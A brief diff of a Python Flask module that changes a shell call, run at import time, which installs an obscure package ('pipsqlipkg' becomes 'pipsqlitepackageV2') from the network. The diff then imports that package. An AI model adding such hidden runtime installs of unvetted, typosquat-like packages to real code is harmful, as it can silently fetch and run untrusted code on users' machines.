@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlipkg")
-import pipsqlipkg
+os.system("pip install pipsqlitepackageV2")
+import pipsqlitepackageV2
 import flask
 
 from flask import g
